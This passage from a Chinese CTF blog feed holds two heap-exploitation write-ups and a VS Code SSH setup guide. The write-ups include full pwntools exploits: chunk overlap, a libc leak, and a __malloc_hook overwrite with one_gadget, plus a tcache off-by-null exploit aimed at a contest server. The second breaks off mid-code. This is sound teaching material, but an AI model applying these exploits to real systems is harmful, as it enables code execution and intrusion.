class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><p>先申请一个chunk0 用于堆溢出覆盖chunk1的size域 从而使chunk1和chunk2合并</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3   #chunk3的作用则是防止堆块释放后和top chunk合并</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br></pre></td></tr></table></figure><p>gdb看一下此时堆块结构</p><p><a href="https://imgse.com/i/zkcynA"><a href="https://s1.ax1x.com/2022/11/14/zkcynA.png" title="zkcynA.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zkcynA.png" alt="zkcynA.png"></a></a></p><p>可以看到已经成功合并了chunk1和chunk2</p><p>此时我们free掉chunk1</p><p>该合并堆块就会进入到unsortedbin</p><p>此时其fd和bk就指向了main_arena+88</p><p>我们如果再申请一个0x68大小的chunk</p><p>此时bin将会把前半部分的堆块分配出来</p><p>于是fd和bk的内容我们就可以通过print新申请的堆块打印出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3&amp;1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure><p>还差一点 要如果才能确定偏移 从而计算出libc基址</p><p>这里我们进行gdb动调 我们需要求出main_arena+88和libc基址的偏移</p><p><a href="https://imgse.com/i/zkgCH1"><a href="https://s1.ax1x.com/2022/11/14/zkgCH1.png" title="zkgCH1.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zkgCH1.png" alt="zkgCH1.png"></a></a></p><p>则可求得 偏移 &#x3D; 0x7f35f3b9bb78-0x7f35f37d7000</p><p>由于开启了FULL RELRO 我们并没有办法篡改got表</p><p>但是此时是ubuntu16.04版本环境 我们想到了使用malloc_hook的攻击方法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_addr = addr - (<span class="number">0x7fc2d9938b78</span>-<span class="number">0x7fc2d9574000</span>)</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><p>此时我们再次申请一个大小为0x68的chunk 它会分配到剩下一半的unsortedbin的空间</p><p>但是你要注意到 chunk2的指针不是还没被置零吗 chunk2和我们新申请到的chunk指向了同一片空间</p><p>这不就可以做到uaf吗 于是我们再次释放chunk2 然后编辑chunk4的内容 覆盖chunk2的fd域 就可以使我们目标地址串连到fastbin上</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(malloc_hook)),p64(malloc_hook-<span class="number">0x23</span>))</span><br></pre></td></tr></table></figure><p><a href="https://imgse.com/i/zkgrCT"><a href="https://s1.ax1x.com/2022/11/14/zkgrCT.png" title="zkgrCT.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/14/zkgrCT.png" alt="zkgrCT.png"></a></a></p><p>此时我们连续申请两个堆块 第二个堆块就是分配到对应地址的空间</p><p>此时我们编辑第二个堆块 覆盖malloc_hook为onegadget地址</p><p>这样我们在申请新chunk时系统调用malloc函数时就会调用onegadget</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5 </span></span><br><span class="line">onegadget = <span class="number">0x4526a</span>+libc_addr  <span class="comment">#0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>+<span class="number">0xb</span>)+p64(onegadget)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>完整exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;node4.buuoj.cn&quot;,25931)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Command:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>)<span class="comment">#3</span></span><br><span class="line">payload = cyclic(<span class="number">0x18</span>)+<span class="string">b&quot;\xe1&quot;</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#3&amp;1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = addr - (<span class="number">0x7fc2d9938b78</span>-<span class="number">0x7fc2d9574000</span>)</span><br><span class="line">malloc_hook = libc_addr+libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">system_addr = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4&amp;2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(malloc_hook)),p64(malloc_hook-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#4 </span></span><br><span class="line">add(<span class="number">0x68</span>)<span class="comment">#5 </span></span><br><span class="line">onegadget = <span class="number">0x4526a</span>+libc_addr  <span class="comment">#0x45216  0x4526a  0xf02a4  0xf1147</span></span><br><span class="line">payload = cyclic(<span class="number">0x8</span>+<span class="number">0xb</span>)+p64(onegadget)</span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x30</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>vscode远程连接</title>
      <link href="/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/"/>
      <url>/2022/11/13/vscode%E8%BF%9C%E7%A8%8B%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>先把虚拟机需要的环境配置一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install curl</span><br></pre></td></tr></table></figure><p>接着在物理机上创建一下ssh密匙</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f %USERPROFILE%/.ssh/debian_rsa</span><br></pre></td></tr></table></figure><p>然后自己下载一个vscode</p><p>下载后打开 在扩展中搜索remote</p><p><a href="https://imgse.com/i/zFfZA1"><a href="https://s1.ax1x.com/2022/11/13/zFfZA1.png" title="zFfZA1.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFfZA1.png" alt="zFfZA1.png"></a></a></p><p>安装这个 然后进入到设置里面勾选这个</p><p><a href="https://imgse.com/i/zFfmh6"><a href="https://s1.ax1x.com/2022/11/13/zFfmh6.png" title="zFfmh6.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFfmh6.png" alt="zFfmh6.png"></a></a></p><p>然后左下角会多出来一个绿色的图标 按图上的点击顺序</p><p><a href="https://imgse.com/i/zFfJAI"><a href="https://s1.ax1x.com/2022/11/13/zFfJAI.png" title="zFfJAI.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFfJAI.png" alt="zFfJAI.png"></a></a></p><p><a href="https://imgse.com/i/zFfa38"><a href="https://s1.ax1x.com/2022/11/13/zFfa38.png" title="zFfa38.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFfa38.png" alt="zFfa38.png"></a></a></p><p>选择第一个</p><p>然后自行配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host 名称</span><br><span class="line">HostName ip地址</span><br><span class="line">User 虚拟机用户名</span><br><span class="line">IdentityFile &quot;C:\Users\xxxxx\.ssh\debian_rsa&quot;  //物理机的ssh私匙目录</span><br></pre></td></tr></table></figure><p>接着试着连接一下</p><p><a href="https://imgse.com/i/zFhAxS"><a href="https://s1.ax1x.com/2022/11/13/zFhAxS.png" title="zFhAxS.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFhAxS.png" alt="zFhAxS.png"></a></a></p><p>输入密码后就连接上了虚拟机</p><p>但是每次都输入密码太麻烦了 我们之前弄的ssh就是为了免密连接</p><p><a href="https://imgse.com/i/zFhuan"><a href="https://s1.ax1x.com/2022/11/13/zFhuan.png" title="zFhuan.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/13/zFhuan.png" alt="zFhuan.png"></a></a></p><p>在虚拟机对应目录下 创建一个文件authorized_keys</p><p>接着把物理机中该文件的内容复制到虚拟机刚刚创建的文件中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\xxxx\.ssh\debian_rsa.pub</span><br></pre></td></tr></table></figure><p>然后就可以做到免密连接了 </p><p><strong>2023&#x2F;3&#x2F;6记</strong><br>今天配置kali虚拟机的远程连接的时候迟迟连接不上 原来是因为ssh服务并没有启动</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 重启ssh 服务 sudo service ssh --full-restart</span><br><span class="line">// 自动启动 sudo systemctl enable ssh</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> extra </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ISCTF2022-null</title>
      <link href="/2022/11/02/ISCTF2022-null/"/>
      <url>/2022/11/02/ISCTF2022-null/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><p>看一下保护机制</p><p><a href="https://imgse.com/i/xH5Lff"><a href="https://s1.ax1x.com/2022/11/02/xH5Lff.png" title="xH5Lff.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xH5Lff.png" alt="xH5Lff.png"></a></a></p><p>再拖到ida查看一下main函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;1.ADD&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;2.CHANGE&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;3.PRINT&quot;</span>);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;4.DEL&quot;</span>);</span><br><span class="line">      <span class="built_in">putchar</span>(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">      __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3);</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      edit();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        print();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        del();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_13:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;NO CHOICE&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">1</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_13;</span><br><span class="line">      add();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>菜单题 其他函数没有什么好说的 重点看两个函数 delete和edit</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">del</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(Page[v1]);</span><br><span class="line">    Page[v1] = <span class="number">0LL</span>;</span><br><span class="line">    Size[v1] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针置零了  没有办法UAF</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">31</span> &amp;&amp; Page[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">    vuln(Page[v1], Size[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体跟进到vuln函数</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">vuln</span><span class="params">(_BYTE *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a2 &gt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> ( read(<span class="number">0</span>, a1, <span class="number">1uLL</span>) == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *a1 == <span class="string">&#x27;\n&#x27;</span> || (++a1, v2 == a2) )</span><br><span class="line">      &#123;</span><br><span class="line">        *a1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意这里有一个off by null的漏洞 读入的换行符会被替换成0</p><p>首先要泄露libc基址  这里采用unsortedbin泄露基址的办法</p><p>但是由于远程靶机的版本是ubuntu18.04 新增了tcache</p><p>所以我们要先把tcache填满</p><p>前置代码:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> lseek</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="comment">#io = process(&quot;./null&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;120.79.18.34&quot;</span>,<span class="number">20273</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./null&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Size &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print</span>(<span class="params">index</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">0x18</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x68</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    add(i,<span class="number">0xd0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>,<span class="number">10</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\xe1&#x27;</span>)</span><br></pre></td></tr></table></figure><p>我们先申请三个堆块 chunk1和2用来合并成一个fake chunk</p><p>这里注意一下后续申请的七个chunk大小</p><p>后续gdb动调看一下就很容易明白</p><p><a href="https://imgse.com/i/xHoxds"><a href="https://s1.ax1x.com/2022/11/02/xHoxds.png" title="xHoxds.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHoxds.png" alt="xHoxds.png"></a></a></p><p>这里可以看到 chunk1和chunk2已经合并成了一个0xe1大小的堆块</p><p>我们具体查看一下当前chunk的内容</p><p><a href="https://imgse.com/i/xHTeoR"><a href="https://s1.ax1x.com/2022/11/02/xHTeoR.png" title="xHTeoR.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHTeoR.png" alt="xHTeoR.png"></a></a></p><p>可以看到是因为刚才的edit改变了chunk1的size大小</p><p>接着我们free一下chunk1 此时由于tcache已经被填满了 所以chunk1就会被释放到unsortedbin</p><p>由于其机制  所以此时fd和bk都会指向main_arena+0x??的地址</p><p>通过再次申请一个chunk 再调用print函数 就可以打印出我们需要的地址 此时再计算偏移 就可以求出基址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x68</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>我们逐步拆分一下这一层的操作</p><p>首先是执行完free</p><p><a href="https://imgse.com/i/xHTsmQ"><a href="https://s1.ax1x.com/2022/11/02/xHTsmQ.png" title="xHTsmQ.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHTsmQ.png" alt="xHTsmQ.png"></a></a></p><p>成功划入unsortedbin</p><p>再申请一个大小为0x68的chunk(只申请一半  是为了接下来的double free做铺垫)</p><p><a href="https://imgse.com/i/xHHTiR"><a href="https://s1.ax1x.com/2022/11/02/xHHTiR.png" title="xHHTiR.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHHTiR.png" alt="xHHTiR.png"></a></a></p><p>跟进看一下新申请的chunk的内容</p><p><a href="https://imgse.com/i/xHHxdH"><a href="https://s1.ax1x.com/2022/11/02/xHHxdH.png" title="xHHxdH.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHHxdH.png" alt="xHHxdH.png"></a></a></p><p>这里你会发现两个的chunk fd和bk差了208</p><p>这正是0xd0的十进制</p><p>但是这并不妨碍我们计算基址</p><p>记录下此时动调的fd值</p><p>在gdb中我们输入vmmap libc查看一下当前程序运行的libc基址</p><p>然后求出偏移 虽然程序每次运行的libc基址和我们泄露出来的main_arena地址都会变化</p><p>但是这个偏移值是固定的</p><p><a href="https://imgse.com/i/xHbVeg"><a href="https://s1.ax1x.com/2022/11/02/xHbVeg.png" title="xHbVeg.png" class="gallery-item"><img src="https://s1.ax1x.com/2022/11/02/xHbVeg.png" alt="xHbVeg.png"></a></a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">libc_addr = main_arena_addr - offset</span><br><span class="line">offset = 0x7fa1d8fa7d70 - 0x7fa1d8bbc000</span><br></pre></td></tr></table></figure><p>基址出来以后 one_gadget和free_hook以及system的地址都可以求出来了</p><p>由于程序开启了FULL RELRO保护 我们不能篡改free函数的got表</p><p>但是我们可以修改free_hook函数的got表</p><p>这里可以应用double free的办法来把free_hook的函数地址放到tcache链上</p><p>先把计算基址和一些必要的数据的exp放出来</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="number">10</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">main_arean = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc_addr = main_arean -(<span class="number">0x7f91b42a5d70</span>-<span class="number">0x7f91b3eba000</span>)</span><br><span class="line">system_addr  = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr   = libc_addr + 